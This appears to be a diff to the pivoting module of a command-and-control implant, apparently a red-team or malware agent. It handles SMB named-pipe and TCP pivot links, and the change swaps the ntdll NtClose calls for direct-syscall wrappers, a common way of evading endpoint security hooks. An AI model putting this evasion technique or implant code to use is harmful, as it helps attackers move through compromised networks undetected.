@@ -1,4 +1,5 @@
 #include "Pivotter.h"
+#include "Syscalls.h"
 
 void* Pivotter::operator new(size_t sz) 
 {
@@ -67,7 +68,7 @@ void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packe
 	}
 
 	ApiWin->DisconnectNamedPipe(hPipe);
-	ApiNt->NtClose(hPipe);
+	SysNtClose(hPipe);
 
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(0x1111ffff);			// COMMAND_ERROR
@@ -182,7 +183,7 @@ void Pivotter::UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer*
 			if (pivotData->Type == PIVOT_TYPE_SMB) {
 				if (pivotData->Channel) {
 					ApiWin->DisconnectNamedPipe(pivotData->Channel);
-					ApiNt->NtClose(pivotData->Channel);
+					SysNtClose(pivotData->Channel);
 				}
 			}
 			else if (pivotData->Type == PIVOT_TYPE_TCP) {
@@ -268,7 +269,7 @@ void Pivotter::ProcessPivots(Packer* packer)
 						TEB->LastErrorValue = 0;
 
 						ApiWin->DisconnectNamedPipe(pivotData->Channel);
-						ApiNt->NtClose(pivotData->Channel);
+						SysNtClose(pivotData->Channel);
 
 						packer->Pack32(0);
 						packer->Pack32(COMMAND_UNLINK);
